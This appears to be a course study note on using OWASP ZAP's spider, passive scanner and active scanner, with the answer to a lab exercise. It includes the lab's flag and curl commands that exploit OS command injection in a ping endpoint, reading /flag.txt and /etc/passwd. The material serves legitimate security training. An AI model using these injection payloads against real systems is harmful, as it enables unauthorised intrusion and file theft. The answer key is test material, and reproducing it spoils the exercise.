# Section 13 — ZAP Scanner

> ZAP's free equivalent of Burp Scanner. Spider + passive + active scanning, no Pro license needed.

---

## Lab Answer

| Question | Answer |
|----------|--------|
| Run ZAP Scanner, find high vulnerability, read /flag.txt | `HTB{5c4nn3r5_f1nd_vuln5_w3_m155}` |

**Vulnerability:** OS Command Injection on `/devtools/ping.php` via GET parameter `ip`

**The working exploit:**
```bash
# The form uses GET, not POST — ZAP's scanner discovered this
curl -s "http://TARGET/devtools/ping.php?ip=127.0.0.1%26cat+/flag.txt%26"
# %26 = URL-encoded & operator
# 127.0.0.1&cat /flag.txt& = inject cat command between background processes

# The path to finding it:
# 1. Spider found /devtools/ → /devtools/ping.php
# 2. Active scanner fuzzing found ip parameter accepts OS commands
# 3. ZAP confirmed with evidence: root:x:0:0 from /etc/passwd
```

---

## ZAP Spider — Build the Site Map

**When:** As soon as you have a target. Always spider before active scanning.
**Why:** Finds all reachable pages and endpoints before attacking them.

```
Method 1 — ZAP HUD:
  Browse to the target page → click Spider Start (second button, right pane)

Method 2 — ZAP UI:
  Proxy History → right-click request → Attack → Spider

Method 3 — Top menu:
  Tools → Spider → New Scan → enter target URL
```

**Spider vs Ajax Spider:**
| Spider | Ajax Spider |
|--------|-------------|
| Follows HTML links | Also executes JavaScript to find links loaded dynamically |
| Fast | Slower (launches a real browser) |
| Misses JS-rendered content | Catches AJAX-loaded endpoints |
| Run first | Run after regular Spider for better coverage |

After spidering, check: **Sites Tree** (left pane or ZAP UI → Sites tab) for all discovered paths.

---

## Passive Scanner — Runs Automatically

ZAP runs the passive scanner automatically on every response during spidering. You don't need to start it manually.

```
View results: Alerts tab (ZAP UI) or Alerts button (HUD)
Left pane (HUD) = alerts on the current page
Right pane (HUD) = overall alerts across all pages
```

**Common passive findings:**
- Missing X-Frame-Options header (Clickjacking)
- Missing Content-Security-Policy
- Cookies without HttpOnly/Secure flags
- Information disclosure in responses

---

## Active Scanner — Finds Real Vulnerabilities

**What it does:** Fuzzes all discovered parameters with attack payloads for SQLi, XSS, command injection, path traversal, XXE, SSRF, etc.

```
Method 1 — ZAP HUD:
  Click Active Scan button (right pane) after Spider completes

Method 2 — ZAP UI:
  Tools → Active Scan → select target → Start Scan

Method 3 — Right-click:
  Proxy History → right-click request → Attack → Active Scan
```

**View progress:**
```
Active Scan tab (ZAP UI bottom pane) → shows % complete and requests sent
Alerts tab → populated as vulnerabilities are found during the scan
```

**When the Active Scan finds something:**
```
Alerts tab → filter by "High" → click the alert
→ shows: Attack payload used, Evidence (proof the vuln exists), URL and parameter
→ click URL to see the exact request/response ZAP used
→ Replay in Console / Replay in Browser to reproduce it
```

---

## Reading Alert Details

Key fields in a ZAP alert:
| Field | What It Means |
|-------|--------------|
| **Risk** | High / Medium / Low / Informational |
| **Confidence** | Medium / High — how confident ZAP is |
| **Parameter** | Which parameter was vulnerable |
| **Attack** | The exact payload ZAP used |
| **Evidence** | What proved the vulnerability (e.g., `root:x:0:0`) |

**High + Medium/High Confidence** = findings you can act on immediately.

---

## Generating Reports

```
Top menu → Report → Generate HTML Report (or XML, Markdown, JSON)
→ choose save location
→ open in browser
```

Report includes: all alerts sorted by severity, full request/response details, remediation advice.

---

## ZAP Scanner vs Burp Scanner

| | ZAP Scanner | Burp Scanner |
|---|---|---|
| Cost | Free | Pro required |
| Speed | Fast | Very fast |
| Active scan | ✅ Free | ✅ Pro only |
| Crawler | Spider + Ajax Spider | Crawler |
| OAST detection | ✅ | ✅ |
| Report export | HTML, XML, Markdown, JSON | HTML |
| Best for | Free comprehensive scanning | Advanced enterprise scanning |

---

## Lab Methodology (What ZAP Would Have Found)

```
1. Spider → found /devtools/ directory listing → /devtools/ping.php
2. Passive scan → nothing on ping.php (blank response)
3. Active scan → fuzzed all parameters including GET ip parameter
   → tried: 127.0.0.1&cat /etc/passwd&
   → response contained "root:x:0:0" → OS command injection confirmed
4. Replicate manually:
   curl "http://TARGET/devtools/ping.php?ip=127.0.0.1%26cat+/flag.txt%26"
```

---

## Exam Notes

- ZAP Spider = **free** automatic crawler — use it before every active scan
- Passive scan runs automatically during spidering — no extra steps needed
- ZAP Active Scanner is **free** (Burp requires Pro) — major advantage over Burp Community
- Ajax Spider handles JavaScript-heavy apps — run it after regular Spider for SPA/React sites
- High + Medium Confidence alerts = investigate and attempt to reproduce manually
- Always check the **Attack** and **Evidence** fields in an alert — they tell you exactly what worked
- ZAP uses Out-of-Band detection for blind vulnerabilities (DNS/HTTP callbacks) — more detections than timing-based methods
- After scanner finds something, use **Replay in Console** or the Request Editor to replay the exact vulnerable request
- The flag was only accessible via GET, not POST — scanners try both methods automatically
